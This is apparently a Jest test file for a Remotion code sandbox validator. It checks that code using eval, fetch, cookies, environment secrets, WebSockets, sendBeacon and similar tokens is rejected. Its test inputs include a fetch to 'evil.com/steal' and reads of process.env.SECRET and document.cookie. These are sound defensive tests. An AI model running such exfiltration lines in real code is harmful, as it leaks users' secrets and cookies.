import { validateCode, sanitizeCode } from '@/lib/remotion/sandbox';

describe('validateCode', () => {
  it('allows clean Remotion component code', () => {
    const code = `
      const { useCurrentFrame, AbsoluteFill } = remotion;
      const PARAMS = { color: '#fff' };
      const Component = () => <AbsoluteFill style={{ backgroundColor: PARAMS.color }} />;
    `;
    expect(validateCode(code)).toEqual({ valid: true, errors: [] });
  });

  it('blocks eval usage', () => {
    const code = `eval('malicious code')`;
    expect(validateCode(code).valid).toBe(false);
    expect(validateCode(code).errors).toContain('Forbidden: eval');
  });

  it('blocks fetch usage', () => {
    const code = `fetch('https://evil.com/steal')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks process access', () => {
    const code = `process.env.SECRET`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks document.cookie access', () => {
    const code = `document.cookie`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks dynamic import', () => {
    const code = `import('malicious')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks require', () => {
    const code = `require('fs')`;
    expect(validateCode(code).valid).toBe(false);
  });

  // TM-34 — extended deny list
  it('blocks new Function', () => {
    expect(validateCode(`const f = new Function('return 1');`).valid).toBe(false);
  });

  it('blocks setTimeout-with-string', () => {
    expect(validateCode(`setTimeout("alert(1)", 0);`).valid).toBe(false);
  });

  it('blocks WebSocket', () => {
    expect(validateCode(`const ws = new WebSocket('wss://e.com');`).valid).toBe(false);
  });

  it('blocks navigator.sendBeacon', () => {
    expect(validateCode(`navigator.sendBeacon('/x', d);`).valid).toBe(false);
  });

  it('blocks indexedDB', () => {
    expect(validateCode(`indexedDB.open('x');`).valid).toBe(false);
  });

  it('blocks __proto__ assignment', () => {
    expect(validateCode(`obj.__proto__ = bad;`).valid).toBe(false);
  });

  it('blocks __defineGetter__', () => {
    expect(validateCode(`o.__defineGetter__('x', f);`).valid).toBe(false);
  });

  it('blocks with statement', () => {
    expect(validateCode(`with (obj) { x = 1; }`).valid).toBe(false);
  });

  it('blocks Worker spawn', () => {
    expect(validateCode(`new Worker('w.js')`).valid).toBe(false);
    expect(validateCode(`new SharedWorker('w.js')`).valid).toBe(false);
  });

  it('blocks location.assign', () => {
    expect(validateCode(`location.assign('/evil');`).valid).toBe(false);
  });

  it('blocks EventSource', () => {
    expect(validateCode(`new EventSource('/sse');`).valid).toBe(false);
  });

  it('does not double-report the same forbidden token', () => {
    const code = `eval('1'); eval('2'); eval('3');`;
    const errors = validateCode(code).errors;
    expect(errors.filter(e => e === 'Forbidden: eval')).toHaveLength(1);
  });
});

describe('sanitizeCode', () => {
  it('removes remotion import statements', () => {
    const code = `import { useCurrentFrame } from 'remotion';\nconst frame = useCurrentFrame();`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'remotion'");
    expect(result).toContain('const frame = useCurrentFrame()');
  });

  it('removes react import statements', () => {
    const code = `import React from 'react';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'react'");
  });
});
